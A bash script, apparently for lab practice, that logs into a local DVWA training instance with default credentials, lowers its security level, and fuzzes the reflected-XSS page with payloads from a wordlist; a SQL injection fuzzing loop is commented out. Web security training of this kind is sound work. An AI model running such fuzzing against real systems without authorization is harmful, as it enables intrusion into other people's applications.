#!/bin/bash
TARGET="192.168.122.109"
BASE_URL="http://$TARGET/DVWA"
DVWA_USER="admin"
DVWA_PASS="password"
SQL_WORDLIST="SQL-Injection-Wordlist.txt"
XSS_WORDLIST="XSS-Wordlist.txt"

echo "[*] Target: $BASE_URL"

# --- Login & Get Session (In-Memory) ---
INIT_PAGE=$(curl -s "$BASE_URL/login.php")
USER_TOKEN=$(echo "$INIT_PAGE" | grep -oP '(?<=name="user_token" value=")[^"]*')
echo "[+] CSRF Token: $USER_TOKEN"

RAW_COOKIES=$(curl -s -i \
  -d "username=$DVWA_USER&password=$DVWA_PASS&user_token=$USER_TOKEN&Login=Login" \
  "$BASE_URL/login.php" | grep -i "Set-Cookie")

SESSION_ID=$(echo "$RAW_COOKIES" | grep -oP 'PHPSESSID=\K[^;]*')

if [ -z "$SESSION_ID" ]; then
  echo "[!] Login failed."
  exit 1
fi

echo "[+] Session ID: $SESSION_ID"
COOKIE_STR="security=low; PHPSESSID=$SESSION_ID"

curl -s -b "$COOKIE_STR" \
  -d "security=low&seclev_submit=Submit" \
  "$BASE_URL/security.php" >/dev/null

# --- SQL Injection Fuzzing ---
# echo -e "\n[*] Starting SQL Injection fuzzing..."
# while IFS= read -r PAYLOAD || [ -n "$PAYLOAD" ]; do
#   ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
#   RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
#     -b "$COOKIE_STR" \
#     "$BASE_URL/vulnerabilities/sqli/?id=${ENCODED}&Submit=Submit")

#   echo "[SQLi] Payload: $PAYLOAD | Status: $RESPONSE"
# done <"$SQL_WORDLIST"

# --- XSS Fuzzing ---
echo -e "\n[*] Starting XSS fuzzing..."
while IFS= read -r PAYLOAD || [ -n "$PAYLOAD" ]; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    -b "$COOKIE_STR" \
    "$BASE_URL/vulnerabilities/xss_r/?name=${ENCODED}")

  echo "[XSS] Payload: $PAYLOAD | Status: $RESPONSE"
done <"$XSS_WORDLIST"
